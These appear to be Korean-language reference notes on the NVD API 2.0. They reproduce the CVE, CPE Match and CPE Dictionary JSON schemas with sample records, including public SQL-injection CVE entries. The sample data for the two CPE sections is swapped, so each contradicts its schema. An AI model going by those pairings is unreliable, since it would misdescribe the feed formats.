### CVE

- 데이터 스키마
    
    https://csrc.nist.gov/schema/nvd/api/2.0/cve_api_json_2.0.schema
    
    ```json
    {
        "$schema": "http://json-schema.org/draft-07/schema#",
        "title": "JSON Schema for NVD Vulnerability Data API version 2.2.3",
        "definitions": {
            "def_cve_item": {
                "properties": {
                    "cve": {
                        "$ref": "#/definitions/cve_item"
                    }
                },
                "required": [
                    "cve"
                ],
                "additionalProperties": false
            },
            "cve_item": {
                "type": "object",
                "properties": {
                    "id": {
                        "$ref": "#/definitions/cve_id"
                    },
                    "sourceIdentifier": {
                        "type": "string"
                    },
                    "vulnStatus": {
                        "type": "string"
                    },
                    "published": {
                        "type": "string",
                        "format": "date-time"
                    },
                    "lastModified": {
                        "type": "string",
                        "format": "date-time"
                    },
                    "evaluatorComment": {
                        "type": "string"
                    },
                    "evaluatorSolution": {
                        "type": "string"
                    },
                    "evaluatorImpact": {
                        "type": "string"
                    },
                    "cisaExploitAdd": {
                        "type": "string",
                        "format": "date"
                    },
                    "cisaActionDue": {
                        "type": "string",
                        "format": "date"
                    },
                    "cisaRequiredAction": {
                        "type": "string"
                    },
                    "cisaVulnerabilityName": {
                        "type": "string"
                    },
                    "cveTags": {
                        "type": "array",
                        "items": {
                            "type": "object",
                            "properties": {
                                "sourceIdentifier": {
                                    "description": "The email address or UUID of the source that contributed the information",
                                    "type": "string"
                                },
                                "tags": {
                                    "type": "array",
                                    "items": {
                                        "type": "string",
                                        "enum": [
                                            "unsupported-when-assigned",
                                            "exclusively-hosted-service",
                                            "disputed"
                                        ]
                                    }
                                }
                            }
                        }
                    },
                    "descriptions": {
                        "type": "array",
                        "minItems": 1,
                        "items": {
                            "$ref": "#/definitions/lang_string"
                        }
                    },
                    "references": {
                        "type": "array",
                        "items": {
                            "$ref": "#/definitions/reference"
                        }
                    },
                    "metrics": {
                        "description": "Metric scores for a vulnerability as found on NVD.",
                        "type": "object",
                        "properties": {
                            "cvssMetricV40": {
                                "description": "CVSS V4.0 score.",
                                "type": "array",
                                "items": {
                                    "$ref": "#/definitions/cvss-v40"
                                }
                            },
                            "cvssMetricV31": {
                                "description": "CVSS V3.1 score.",
                                "type": "array",
                                "items": {
                                    "$ref": "#/definitions/cvss-v31"
                                }
                            },
                            "cvssMetricV30": {
                                "description": "CVSS V3.0 score.",
                                "type": "array",
                                "items": {
                                    "$ref": "#/definitions/cvss-v30"
                                }
                            },
                            "cvssMetricV2": {
                                "description": "CVSS V2.0 score.",
                                "type": "array",
                                "items": {
                                    "$ref": "#/definitions/cvss-v2"
                                }
                            }
                        }
                    },
                    "weaknesses": {
                        "type": "array",
                        "items": {
                            "$ref": "#/definitions/weakness"
                        }
                    },
                    "configurations": {
                        "type": "array",
                        "items": {
                            "$ref": "#/definitions/config"
                        }
                    },
                    "vendorComments": {
                        "type": "array",
                        "items": {
                            "$ref": "#/definitions/vendorComment"
                        }
                    }
                },
                "required": [
                    "id",
                    "published",
                    "lastModified",
                    "references",
                    "descriptions"
                ]
            },
            "cvss-v2": {
                "properties": {
                    "source": {
                        "type": "string"
                    },
                    "type": {
                        "enum": [
                            "Primary",
                            "Secondary"
                        ]
                    },
                    "cvssData": {
                        "$ref": "https://csrc.nist.gov/schema/nvd/api/2.0/external/cvss-v2.0.json"
                    },
                    "baseSeverity": {
                        "type": "string"
                    },
                    "exploitabilityScore": {
                        "$ref": "#/definitions/def_subscore"
                    },
                    "impactScore": {
                        "$ref": "#/definitions/def_subscore"
                    },
                    "acInsufInfo": {
                        "type": "boolean"
                    },
                    "obtainAllPrivilege": {
                        "type": "boolean"
                    },
                    "obtainUserPrivilege": {
                        "type": "boolean"
                    },
                    "obtainOtherPrivilege": {
                        "type": "boolean"
                    },
                    "userInteractionRequired": {
                        "type": "boolean"
                    }
                },
                "required": [
                    "source",
                    "type",
                    "cvssData"
                ],
                "additionalProperties": false
            },
            "cvss-v30": {
                "properties": {
                    "source": {
                        "type": "string"
                    },
                    "type": {
                        "enum": [
                            "Primary",
                            "Secondary"
                        ]
                    },
                    "cvssData": {
                        "$ref": "https://csrc.nist.gov/schema/nvd/api/2.0/external/cvss-v3.0.json"
                    },
                    "exploitabilityScore": {
                        "$ref": "#/definitions/def_subscore"
                    },
                    "impactScore": {
                        "$ref": "#/definitions/def_subscore"
                    }
                },
                "required": [
                    "source",
                    "type",
                    "cvssData"
                ],
                "additionalProperties": false
            },
            "cvss-v31": {
                "properties": {
                    "source": {
                        "type": "string"
                    },
                    "type": {
                        "enum": [
                            "Primary",
                            "Secondary"
                        ]
                    },
                    "cvssData": {
                        "$ref": "https://csrc.nist.gov/schema/nvd/api/2.0/external/cvss-v3.1.json"
                    },
                    "exploitabilityScore": {
                        "$ref": "#/definitions/def_subscore"
                    },
                    "impactScore": {
                        "$ref": "#/definitions/def_subscore"
                    }
                },
                "required": [
                    "source",
                    "type",
                    "cvssData"
                ],
                "additionalProperties": false
            },
            "cvss-v40": {
                "properties": {
                    "source": {
                        "type": "string"
                    },
                    "type": {
                        "enum": [
                            "Primary",
                            "Secondary"
                        ]
                    },
                    "cvssData": {
                        "$ref": "https://csrc.nist.gov/schema/nvd/api/2.0/external/cvss-v4.0.json"
                    }
                },
                "required": [
                    "source",
                    "type",
                    "cvssData"
                ],
                "additionalProperties": false
            },
            "cve_id": {
                "type": "string",
                "pattern": "^CVE-[0-9]{4}-[0-9]{4,}$"
            },
            "lang_string": {
                "type": "object",
                "properties": {
                    "lang": {
                        "type": "string"
                    },
                    "value": {
                        "type": "string",
                        "maxLength": 4096
                    }
                },
                "required": [
                    "lang",
                    "value"
                ],
                "additionalProperties": false
            },
            "reference": {
                "type": "object",
                "properties": {
                    "url": {
    					"type": "string",
    					"format": "uri",
    					"minLength": 1,
    					"maxLength": 2048
                    },
                    "source": {
                        "type": "string"
                    },
                    "tags": {
                        "type": "array",
                        "items": {
                            "type": "string"
                        }
                    }
                },
                "required": [
                    "url"
                ]
            },
            "vendorComment": {
                "type": "object",
                "properties": {
                    "organization": {
                        "type": "string"
                    },
                    "comment": {
                        "type": "string"
                    },
                    "lastModified": {
                        "type": "string",
                        "format": "date-time"
                    }
                },
                "required": [
                    "organization",
                    "comment",
                    "lastModified"
                ],
                "additionalProperties": false
            },
            "weakness": {
                "properties": {
                    "source": {
                        "type": "string"
                    },
                    "type": {
                        "type": "string"
                    },
                    "description": {
                        "type": "array",
                        "minItems": 0,
                        "items": {
                            "$ref": "#/definitions/lang_string"
                        }
                    }
                },
                "required": [
                    "source",
                    "type",
                    "description"
                ],
                "additionalProperties": false
            },
            "config": {
                "properties": {
                    "operator": {
                        "type": "string",
                        "enum": [
                            "AND",
                            "OR"
                        ]
                    },
                    "negate": {
                        "type": "boolean"
                    },
                    "nodes": {
                        "type": "array",
                        "items": {
                            "$ref": "#/definitions/node"
                        }
                    }
                },
                "required": [
                    "nodes"
                ]
            },
            "node": {
                "description": "Defines a configuration node in an NVD applicability statement.",
                "properties": {
                    "operator": {
                        "type": "string",
                        "enum": [
                            "AND",
                            "OR"
                        ]
                    },
                    "negate": {
                        "type": "boolean"
                    },
                    "cpeMatch": {
                        "type": "array",
                        "items": {
                            "$ref": "#/definitions/cpe_match"
                        }
                    }
                },
                "required": [
                    "operator",
                    "cpeMatch"
                ]
            },
            "cpe_match": {
                "description": "CPE match string or range",
                "type": "object",
                "properties": {
                    "vulnerable": {
                        "type": "boolean"
                    },
                    "criteria": {
                        "type": "string"
                    },
                    "matchCriteriaId": {
                        "type": "string",
                        "format": "uuid"
                    },
                    "versionStartExcluding": {
                        "type": "string"
                    },
                    "versionStartIncluding": {
                        "type": "string"
                    },
                    "versionEndExcluding": {
                        "type": "string"
                    },
                    "versionEndIncluding": {
                        "type": "string"
                    }
                },
                "required": [
                    "vulnerable",
                    "criteria",
                    "matchCriteriaId"
                ]
            },
            "def_subscore": {
                "description": "CVSS subscore.",
                "type": "number",
                "minimum": 0,
                "maximum": 10
            }
        },
        "type": "object",
        "properties": {
            "resultsPerPage": {
                "type": "integer"
            },
            "startIndex": {
                "type": "integer"
            },
            "totalResults": {
                "type": "integer"
            },
            "format": {
                "type": "string"
            },
            "version": {
                "type": "string"
            },
            "timestamp": {
                "type": "string",
                "format": "date-time"
            },
            "vulnerabilities": {
                "description": "NVD feed array of CVE",
                "type": "array",
                "items": {
                    "$ref": "#/definitions/def_cve_item"
                }
            }
        },
        "required": [
            "resultsPerPage",
            "startIndex",
            "totalResults",
            "format",
            "version",
            "timestamp",
            "vulnerabilities"
        ],
        "additionalProperties": false
    }
    ```
    
- 예시 데이터
    
    ```json
    {
      "resultsPerPage" : 32952,
      "startIndex" : 0,
      "totalResults" : 32952,
      "format" : "NVD_CVE",
      "version" : "2.0",
      "timestamp" : "2025-11-11T03:00:00.6307802",
      "vulnerabilities" : [ {
        "cve" : {
          "id" : "CVE-2025-0168",
          "sourceIdentifier" : "cna@vuldb.com",
          "published" : "2025-01-01T14:15:23.590",
          "lastModified" : "2025-02-25T21:26:07.113",
          "vulnStatus" : "Analyzed",
          "cveTags" : [ ],
          "descriptions" : [ {
            "lang" : "en",
            "value" : "A vulnerability classified as critical has been found in code-projects Job Recruitment 1.0. This affects an unknown part of the file /_parse/_feedback_system.php. The manipulation of the argument person leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used."
          }, {
            "lang" : "es",
            "value" : "Se ha encontrado una vulnerabilidad clasificada como crítica en code-projects Job Recruitment 1.0. Afecta a una parte desconocida del archivo /_parse/_feedback_system.php. La manipulación del argumento person conduce a la inyección SQL. Es posible iniciar el ataque de forma remota. La vulnerabilidad se ha revelado al público y puede utilizarse."
          } ],
          "metrics" : {
            "cvssMetricV40" : [ {
              "source" : "cna@vuldb.com",
              "type" : "Secondary",
              "cvssData" : {
                "version" : "4.0",
                "vectorString" : "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
                "baseScore" : 5.3,
                "baseSeverity" : "MEDIUM",
                "attackVector" : "NETWORK",
                "attackComplexity" : "LOW",
                "attackRequirements" : "NONE",
                "privilegesRequired" : "LOW",
                "userInteraction" : "NONE",
                "vulnConfidentialityImpact" : "LOW",
                "vulnIntegrityImpact" : "LOW",
                "vulnAvailabilityImpact" : "LOW",
                "subConfidentialityImpact" : "NONE",
                "subIntegrityImpact" : "NONE",
                "subAvailabilityImpact" : "NONE",
                "exploitMaturity" : "NOT_DEFINED",
                "confidentialityRequirement" : "NOT_DEFINED",
                "integrityRequirement" : "NOT_DEFINED",
                "availabilityRequirement" : "NOT_DEFINED",
                "modifiedAttackVector" : "NOT_DEFINED",
                "modifiedAttackComplexity" : "NOT_DEFINED",
                "modifiedAttackRequirements" : "NOT_DEFINED",
                "modifiedPrivilegesRequired" : "NOT_DEFINED",
                "modifiedUserInteraction" : "NOT_DEFINED",
                "modifiedVulnConfidentialityImpact" : "NOT_DEFINED",
                "modifiedVulnIntegrityImpact" : "NOT_DEFINED",
                "modifiedVulnAvailabilityImpact" : "NOT_DEFINED",
                "modifiedSubConfidentialityImpact" : "NOT_DEFINED",
                "modifiedSubIntegrityImpact" : "NOT_DEFINED",
                "modifiedSubAvailabilityImpact" : "NOT_DEFINED",
                "Safety" : "NOT_DEFINED",
                "Automatable" : "NOT_DEFINED",
                "Recovery" : "NOT_DEFINED",
                "valueDensity" : "NOT_DEFINED",
                "vulnerabilityResponseEffort" : "NOT_DEFINED",
                "providerUrgency" : "NOT_DEFINED"
              }
            } ],
            "cvssMetricV31" : [ {
              "source" : "cna@vuldb.com",
              "type" : "Secondary",
              "cvssData" : {
                "version" : "3.1",
                "vectorString" : "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L",
                "baseScore" : 6.3,
                "baseSeverity" : "MEDIUM",
                "attackVector" : "NETWORK",
                "attackComplexity" : "LOW",
                "privilegesRequired" : "LOW",
                "userInteraction" : "NONE",
                "scope" : "UNCHANGED",
                "confidentialityImpact" : "LOW",
                "integrityImpact" : "LOW",
                "availabilityImpact" : "LOW"
              },
              "exploitabilityScore" : 2.8,
              "impactScore" : 3.4
            }, {
              "source" : "nvd@nist.gov",
              "type" : "Primary",
              "cvssData" : {
                "version" : "3.1",
                "vectorString" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                "baseScore" : 7.5,
                "baseSeverity" : "HIGH",
                "attackVector" : "NETWORK",
                "attackComplexity" : "LOW",
                "privilegesRequired" : "NONE",
                "userInteraction" : "NONE",
                "scope" : "UNCHANGED",
                "confidentialityImpact" : "HIGH",
                "integrityImpact" : "NONE",
                "availabilityImpact" : "NONE"
              },
              "exploitabilityScore" : 3.9,
              "impactScore" : 3.6
            } ],
            "cvssMetricV2" : [ {
              "source" : "cna@vuldb.com",
              "type" : "Secondary",
              "cvssData" : {
                "version" : "2.0",
                "vectorString" : "AV:N/AC:L/Au:S/C:P/I:P/A:P",
                "baseScore" : 6.5,
                "accessVector" : "NETWORK",
                "accessComplexity" : "LOW",
                "authentication" : "SINGLE",
                "confidentialityImpact" : "PARTIAL",
                "integrityImpact" : "PARTIAL",
                "availabilityImpact" : "PARTIAL"
              },
              "baseSeverity" : "MEDIUM",
              "exploitabilityScore" : 8.0,
              "impactScore" : 6.4,
              "acInsufInfo" : false,
              "obtainAllPrivilege" : false,
              "obtainUserPrivilege" : false,
              "obtainOtherPrivilege" : false,
              "userInteractionRequired" : false
            } ]
          },
          "weaknesses" : [ {
            "source" : "cna@vuldb.com",
            "type" : "Secondary",
            "description" : [ {
              "lang" : "en",
              "value" : "CWE-74"
            }, {
              "lang" : "en",
              "value" : "CWE-89"
            } ]
          }, {
            "source" : "nvd@nist.gov",
            "type" : "Primary",
            "description" : [ {
              "lang" : "en",
              "value" : "CWE-89"
            } ]
          } ],
          "configurations" : [ {
            "nodes" : [ {
              "operator" : "OR",
              "negate" : false,
              "cpeMatch" : [ {
                "vulnerable" : true,
                "criteria" : "cpe:2.3:a:anisha:job_recruitment:1.0:*:*:*:*:*:*:*",
                "matchCriteriaId" : "56E6381D-BF5F-4DC1-A525-4DEDA44D5C56"
              } ]
            } ]
          } ],
          "references" : [ {
            "url" : "https://code-projects.org/",
            "source" : "cna@vuldb.com",
            "tags" : [ "Product" ]
          }, {
            "url" : "https://github.com/UnrealdDei/cve/blob/main/sql11.md",
            "source" : "cna@vuldb.com",
            "tags" : [ "Exploit", "Third Party Advisory" ]
          }, {
            "url" : "https://vuldb.com/?ctiid.289917",
            "source" : "cna@vuldb.com",
            "tags" : [ "Permissions Required", "VDB Entry" ]
          }, {
            "url" : "https://vuldb.com/?id.289917",
            "source" : "cna@vuldb.com",
            "tags" : [ "Third Party Advisory", "VDB Entry" ]
          }, {
            "url" : "https://vuldb.com/?submit.473107",
            "source" : "cna@vuldb.com",
            "tags" : [ "Third Party Advisory", "VDB Entry" ]
          } ]
        }
      }, {
        "cve" : {
          "id" : "CVE-2025-22214",
          "sourceIdentifier" : "cve@mitre.org",
          "published" : "2025-01-02T04:15:06.277",
          "lastModified" : "2025-01-02T04:15:06.277",
          "vulnStatus" : "Awaiting Analysis",
          "cveTags" : [ ],
          "descriptions" : [ {
            "lang" : "en",
            "value" : "Landray EIS 2001 through 2006 allows Message/fi_message_receiver.aspx?replyid= SQL injection."
          }, {
            "lang" : "es",
            "value" : "Landray EIS 2001 a 2006 permite la inyección SQL Message/fi_message_receiver.aspx?replyid=."
          } ],
          "metrics" : {
            "cvssMetricV31" : [ {
              "source" : "cve@mitre.org",
              "type" : "Secondary",
              "cvssData" : {
                "version" : "3.1",
                "vectorString" : "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
                "baseScore" : 4.3,
                "baseSeverity" : "MEDIUM",
                "attackVector" : "NETWORK",
                "attackComplexity" : "LOW",
                "privilegesRequired" : "LOW",
                "userInteraction" : "NONE",
                "scope" : "UNCHANGED",
                "confidentialityImpact" : "LOW",
                "integrityImpact" : "NONE",
                "availabilityImpact" : "NONE"
              },
              "exploitabilityScore" : 2.8,
              "impactScore" : 1.4
            } ]
          },
          "weaknesses" : [ {
            "source" : "cve@mitre.org",
            "type" : "Secondary",
            "description" : [ {
              "lang" : "en",
              "value" : "CWE-89"
            } ]
          } ],
          "references" : [ {
            "url" : "https://github.com/Zerone0x00/CVE/blob/main/%E8%93%9D%E5%87%8CEISsql%E6%B3%A8%E5%85%A5/1.md",
            "source" : "cve@mitre.org"
          } ]
        }
      }, {
    ```
    

### CPE Match

- 데이터 스키마
    
    https://csrc.nist.gov/schema/nvd/api/2.0/cpematch_api_json_2.0.schema
    
    ```json
    {
        "$schema": "http://json-schema.org/draft-07/schema#",
        "title": "JSON Schema for NVD CVE Applicability Statement CPE Match API version 2.0",
    	"$id": "https://csrc.nist.gov/schema/nvd/api/2.0/cpematch_api_json_2.0.schema",
        "definitions": {
    		"def_matchstring": {
    		  "type": "object",
    		  "properties": {
    			"matchString": {"$ref": "#/definitions/def_match_data"}
    		  },
    		  "required": ["matchString"],
    		  "additionalProperties": false
    		},
    		"def_cpe_name": {
    		  "type": "object",
    		  "properties": {
    			"cpeName": {"type": "string"},
    			"cpeNameId": {"type": "string", "format": "uuid"}
    		  },
    		  "required": ["cpeName", "cpeNameId"],
    		  "additionalProperties": false
    		},
    		"def_match_data": {
    		  "description": "CPE match string or range",
    		  "type": "object",
    		  "properties": {
    			"criteria": {"type": "string"},
    			"matchCriteriaId": {"type": "string", "format": "uuid"},
    			"versionStartExcluding": {"type": "string"},
    			"versionStartIncluding": {"type": "string"},
    			"versionEndExcluding": {"type": "string"},
    			"versionEndIncluding": {"type": "string"},
    			"created": {"type": "string", "format": "date-time"},
    			"lastModified": {"type": "string", "format": "date-time"},
    			"cpeLastModified": {"type": "string", "format": "date-time"},
    			"status": {"type": "string"},
    			"matches": {
    			  "type": "array",
    			  "items": {"$ref": "#/definitions/def_cpe_name"}
    			}
    		  },
    		  "required": ["criteria", "matchCriteriaId", "lastModified", "created", "status"],
    		  "additionalProperties": false
    		}
    	},
        "type": "object",
        "properties": {
    		"resultsPerPage": {"type": "integer"},
    		"startIndex": {"type": "integer"},
    		"totalResults": {"type": "integer"},
    		"format": {"type": "string"},
    		"version": {"type": "string"},
    		"timestamp": {"type": "string", "format": "date-time"},
            "matchStrings": {
                "description": "Array of CPE match strings",
                "type": "array",
                "items": {"$ref": "#/definitions/def_matchstring"}
            }
        },
        "required": [
    		"resultsPerPage",
    		"startIndex",
    		"totalResults",
    		"format",
    		"version",
    		"timestamp",
            "matchStrings"
        ],
    	"additionalProperties": false
    }
    ```
    
- 예시 데이터
    
    ```json
    { "resultsPerPage": 75050, "startIndex": 14, "totalResults": 1504436, "format": "NVD_CPE", "version": "2.0", "timestamp": "2025-11-12T23:52:32.6906851", "products": [ { "cpe": { "deprecated": false, "cpeName": "cpe:2.3:a:progress:kendo_ui_for_vue:0.4.8:*:*:*:*:*:*:*", "cpeNameId": "07061B50-C641-43C1-AA3F-D4B242C21177", "lastModified": "2025-06-27T19:18:35.260", "created": "2025-06-27T19:18:35.260", "titles": [ { "title": "Progress Kendo UI For Vue 0.4.8", "lang": "en" } ], "refs": [ { "ref": "https://www.progress.com/", "type": "Vendor" }, { "ref": "https://www.telerik.com/kendo-vue-ui", "type": "Product" }, { "ref": "https://www.telerik.com/kendo-vue-ui/components/changelogs/ui-for-vue", "type": "Change Log" } ], "deprecates": [ { "cpeName": "cpe:2.3:a:telerik:kendo_ui_for_vue:0.4.8:*:*:*:*:*:*:*", "cpeNameId": "4D65A7C2-B47F-4C27-8F04-07EDA8565819" } ] } }, { "cpe": { "deprecated": false, "cpeName": "cpe:2.3:a:progress:kendo_ui_for_vue:0.5.0:*:*:*:*:*:*:*", "cpeNameId": "9F3FABC1-AC62-4815-ADDA-60D712B62F2F", "lastModified": "2025-06-27T19:18:35.260", "created": "2025-06-27T19:18:35.260", "titles": [ { "title": "Progress Kendo UI For Vue 0.5.0", "lang": "en" } ], "refs": [ { "ref": "https://www.progress.com/", "type": "Vendor" }, { "ref": "https://www.telerik.com/kendo-vue-ui", "type": "Product" }, { "ref": "https://www.telerik.com/kendo-vue-ui/components/changelogs/ui-for-vue", "type": "Change Log" } ], "deprecates": [ { "cpeName": "cpe:2.3:a:telerik:kendo_ui_for_vue:0.5.0:*:*:*:*:*:*:*", "cpeNameId": "C638EDA1-A433-48AB-9C4C-3B0FA82007AD" } ] } }, { "cpe": { "deprecated": false, "cpeName": "cpe:2.3:a:progress:kendo_ui_for_vue:0.5.1:*:*:*:*:*:*:*", "cpeNameId": "F4E87FB6-D0EA-4B19-867D-83B4051AA7B3", "lastModified": "2025-06-27T19:18:35.260", "created": "2025-06-27T19:18:35.260", "titles": [ { "title": "Progress Kendo UI For Vue 0.5.1", "lang": "en" } ], "refs": [ { "ref": "https://www.progress.com/", "type": "Vendor" }, { "ref": "https://www.telerik.com/kendo-vue-ui", "type": "Product" }, { "ref": "https://www.telerik.com/kendo-vue-ui/components/changelogs/ui-for-vue", "type": "Change Log" } ], "deprecates": [ { "cpeName": "cpe:2.3:a:telerik:kendo_ui_for_vue:0.5.1:*:*:*:*:*:*:*", "cpeNameId": "0A64CF36-2445-4A88-8D3D-EF49D42B59DB" } ] } }, {
    ```
    

### CPE Dictionary

- 데이터  스키마
    
    https://csrc.nist.gov/schema/nvd/api/2.0/cpe_api_json_2.0.schema
    
    ```json
    {
      "$schema": "http://json-schema.org/draft-07/schema#",
      "title": "JSON Schema for NVD Common Product Enumeration (CPE) API version 2.0",
      "$id": "https://csrc.nist.gov/schema/nvd/api/2.0/cpe_api_json_2.0.schema",
      "definitions": {
        "defTitle": {
          "description": "Human readable title for CPE",
          "type": "object",
          "properties": {
            "title": {"type": "string"},
            "lang": {"type": "string"}
          },
          "required": ["title", "lang"],
    	  "additionalProperties": false
        },
        "defReference": {
          "description": "Internet resource for CPE",
          "type": "object",
          "properties": {
    		"ref": {
              "type": "string",
              "pattern": "^([A-Za-z][A-Za-z0-9+.-]+):(\\/\\/([^@]+@)?([A-Za-z0-9.\\-_~]+)(:\\d+)?)?((?:[A-Za-z0-9-._~]|%[A-Fa-f0-9]|[!$&'\\[\\]()*+,;=:@])+(?:\\/(?:[A-Za-z0-9-._~]|%[A-Fa-f0-9]|[!$&'\\[\\]()*+,;=:@])*)*|(?:\\/(?:[A-Za-z0-9-._~]|%[A-Fa-f0-9]|[!$&'()*+,;=:@])+)*)?(\\?(?:[A-Za-z0-9-._~]|%[A-Fa-f0-9]|[!$&'\\[\\]()*+,;=:@]|[/?])*)?(\\#(?:[A-Za-z0-9-._~]|%[A-Fa-f0-9]|[!$&'\\[\\]()*+,;=:@]|[/?])*)?$"
            },
            "type": {
              "type": "string",
              "enum": [
                "Advisory",
                "Change Log",
                "Product",
                "Project",
                "Vendor",
                "Version"
              ]
            }
          },
          "required": ["ref"],
    	  "additionalProperties": false
        },
    	
    	"defCpe": {
    		"type": "object",
    		"properties": {
    			"cpe": {
    			  "type": "object",
    			  "properties": {
    				"deprecated" : {"type" : "boolean"},
    				"cpeName": {"type": "string"},
    				"cpeNameId": {"type": "string", "format": "uuid"},
    				"created": {"type": "string", "format": "date-time"},
    				"lastModified": {"type": "string", "format": "date-time"},
    				"titles": {
    				  "type": "array",
    				  "items": {"$ref": "#/definitions/defTitle"}
    				},
    				"refs": {
    				  "type": "array",
    				  "items": {"$ref": "#/definitions/defReference"}
    				},
    				"deprecatedBy": {
    				  "type": "array",
    				  "items": {
    					"type": "object",
    					"properties": {
    						"cpeName": {"type": "string"},
    						"cpeNameId": {"type": "string", "format": "uuid"}
    					}
    				  }
    				},
    				"deprecates": {
    				  "type": "array",
    				  "items": {
    					"type": "object",
    					"properties": {
    						"cpeName": {"type": "string"},
    						"cpeNameId": {"type": "string", "format": "uuid"}
    					}
    				  }
    				}
    			  },
    			  "required": ["cpeName", "cpeNameId", "deprecated", "lastModified", "created"],
    			  "additionalProperties": false
    			}
    		},
    		"required": ["cpe"],
    		"additionalProperties": false
    	}
    
      },
      "type": "object",
      "properties": {
    	"resultsPerPage": {"type": "integer"},
    	"startIndex": {"type": "integer"},
    	"totalResults": {"type": "integer"},
        "format": {"type": "string"},
        "version": {"type": "string"},
        "timestamp": {"type": "string", "format": "date-time"},
        "products": {
          "description": "NVD feed array of CPE",
          "type": "array",
          "items": {"$ref": "#/definitions/defCpe"}
        }
      },
      "required": [
    	"resultsPerPage",
    	"startIndex",
    	"totalResults",
        "format",
        "version",
    	"timestamp",
        "products"
      ],
      "additionalProperties": false
    }
    ```
    
- 예시 데이터
    
    ```json
    {"resultsPerPage": 38589,"startIndex": 1,"totalResults": 595972,"format": "NVD_CPEMatchString","version": "2.0","timestamp": "2025-11-12T23:40:01.1654809","matchStrings": [{"matchString":{"matchCriteriaId":"36FBCF0F-8CEE-474C-8A04-5075AF53FAF4","criteria":"cpe:2.3:a:nmap:nmap:3.27:*:*:*:*:*:*:*","lastModified":"2019-06-17T09:16:33.960","cpeLastModified":"2019-07-22T16:37:38.133","created":"2019-06-17T09:16:33.960","status":"Active","matches":[{"cpeName":"cpe:2.3:a:nmap:nmap:3.27:*:*:*:*:*:*:*","cpeNameId":"4DAAA102-AB17-4491-B383-A1AAC764704C"}]}},{"matchString":{"matchCriteriaId":"D21D57EA-DF58-429B-9FBE-F0080085B62E","criteria":"cpe:2.3:a:gnu:cfengine:2.0.7:p1:*:*:*:*:*:*","lastModified":"2019-06-17T09:16:33.960","cpeLastModified":"2019-07-22T16:37:38.133","created":"2019-06-17T09:16:33.960","status":"Active"}},{"matchString":{"matchCriteriaId":"016659DB-2A62-4046-89F5-E69B0E2A3D51","criteria":"cpe:2.3:h:nortel:cvx_1800_multi-service_access_switch:3.6.3:patch24:*:*:*:*:*:*","lastModified":"2019-06-17T09:16:33.960","cpeLastModified":"2019-07-22T16:37:38.133","created":"2019-06-17T09:16:33.960","status":"Active"}},{"matchString":{"matchCriteriaId":"0EFDB749-57D9-4C81-A0BC-751F97183F61","criteria":"cpe:2.3:a:apache:cloudstack:2.2.7:*:*:*:*:*:*:*","lastModified":"2019-06-17T09:16:33.960","cpeLastModified":"2019-07-22T16:37:38.133","created":"2019-06-17T09:16:33.960","status":"Active","matches":[{"cpeName":"cpe:2.3:a:apache:cloudstack:2.2.7:*:*:*:*:*:*:*","cpeNameId":"4ECC3045-91C5-4AA4-8386-0C5340343B80"}]}},{"matchString":{"matchCriteriaId":"F910046A-4340-4988-A3D6-323F2288D2D1","criteria":"cpe:2.3:a:hitachi:dabroker:03_04:*:*:*:*:*:*:*","lastModified":"2019-06-17T09:16:33.960","cpeLastModified":"2019-07-22T16:37:38.133","created":"2019-06-17T09:16:33.960","status":"Active"}},{"matchString":{"matchCriteriaId":"3CD936D0-B78C-4D87-99D4-A9839FE1CB4E","criteria":"cpe:2.3:a:ibm:marketing_platform:8.5.0.4:*:*:*:*:*:*:*","lastModified":"2019-06-17T09:16:33.960","cpeLastModified":"2019-07-22T16:37:38.133","created":"2019-06-17T09:16:33.960","status":"Active","matches":[{"cpeName":"cpe:2.3:a:ibm:marketing_platform:8.5.0.4:*:*:*:*:*:*:*","cpeNameId":"13AB07F9-75A5-44EE-9FDD-C2EF5E1EE582"}]}},{"matchString":{"matchCriteriaId":"D92E239B-8BD7-4DA7-BC86-4F64638C5203","criteria":"cpe:2.3:a:martin_lambers:msmtp:1.4.11:*:*:*:*:*:*:*","lastModified":"2019-06-17T09:16:33.960","cpeLastModified":"2019-07-22T16:37:38.133","created":"2019-06-17T09:16:33.960","status":"Active"}},{"matchString":{"matchCriteriaId":"8E0FEEB8-6DA5-47DC-AF67-D68B2B96A655","criteria":"cpe:2.3:a:heine.familiedeelstra:booktree:5.x-1.x:dev:*:*:*:*:*:*","lastModified":"2019-06-17T09:16:33.960","cpeLastModified":"2019-07-22T16:37:38.133","created":"2019-06-17T09:16:33.960","status":"Active"}},{"matchString":{"matchCriteriaId":"10215644-3B05-480F-B175-4BDB72619A48","criteria":"cpe:2.3:a:oracle:crm_technical_foundation:12.1.3:*:*:*:*:*:*:*","lastModified":"2019-06-17T09:16:33.960","cpeLastModified":"2021-03-03T22:21:48.897","created":"2019-06-17T09:16:33.960","status":"Active","matches":[{"cpeName":"cpe:2.3:a:oracle:crm_technical_foundation:12.1.3:*:*:*:*:*:*:*","cpeNameId":"9C3A4822-7F97-4788-95E3-8D85DF5BEC6D"}]}},{"matchString":{"matchCriteriaId":"23DAAAEB-EB1E-4BCD-B88E-33418E3FD1DE","criteria":"cpe:2.3:a:samba:samba:4.2.9:*:*:*:*:*:*:*","lastModified":"2022-08-16T20:50:41.180","cpeLastModified":"2019-07-22T16:37:38.133","created":"2019-06-17T09:16:33.960","status":"Active","matches":[{"cpeName":"cpe:2.3:a:samba:samba:4.2.9:*:*:*:*:*:*:*","cpeNameId":"03314030-2F43-4B15-936B-450389794BE0"}]}},{"matchString":{"matchCriteriaId":"3647F0E3-196F-486B-9BAB-75ED24A055ED","criteria":"cpe:2.3:a:digium:asterisk:10.2.0:rc2:digiumphones:*:*:*:*:*","lastModified":"2019-06-17T09:16:33.960","cpeLastModified":"2019-07-22T16:37:38.133","created":"2019-06-17T09:16:33.960","status":"Active","matches":[{"cpeName":"cpe:2.3:a:digium:asterisk:10.2.0:rc2:digiumphones:*:*:*:*:*","cpeNameId":"0459B2E7-DD85-4F45-B2C7-B23E3AEE9F7C"}]}},{"matchString":{"matchCriteriaId":"AA